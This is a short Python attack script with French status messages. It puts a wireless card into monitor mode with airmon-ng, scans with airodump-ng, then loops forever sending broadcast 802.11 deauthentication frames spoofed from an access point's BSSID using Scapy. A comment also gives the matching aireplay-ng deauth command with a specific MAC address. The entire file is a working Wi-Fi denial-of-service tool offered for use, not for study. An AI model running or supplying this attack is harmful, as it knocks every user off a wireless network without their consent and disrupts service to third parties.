#!/usr/bin/python

from scapy.all import *
import subprocess
import utile

BSSID = utile.getAPMac()

subprocess.call('clear', shell=True)

print('Cartes disponibles ....')
subprocess.call('airmon-ng',shell=True)

networkCard = "wlan0"

print (networkCard)

subprocess.call('airmon-ng start {}'.format(networkCard), shell=True)
subprocess.call('airmon-ng check kill', shell=True)

networkCard = '{}mon'.format(networkCard)

try:
    subprocess.call('clear',shell=True)
    print('Scan ...')
    subprocess.call('airodump-ng {}'.format(networkCard),shell=True)
except KeyboardInterrupt:
    print(''*3)

brdMac = 'FF:FF:FF:FF:FF:FF'

print('Attaque ...')
print(''*5)

try:
    while True:
        #aireplay-ng --deauth 0 -a 58:6D:8F:3B:96:F8 mon0
        packet = RadioTap() / Dot11(addr1= brdMac, addr2=BSSID,addr3= BSSID)/Dot11Deauth()
        sendp(packet,iface = networkCard, count= 1000,inter= .2)
except KeyboardInterrupt:
    print('Cleaning ...')
    subprocess.call('airmon-ng stop {}'.format(networkCard),shell=True)
    subprocess.call('clear',shell=True)
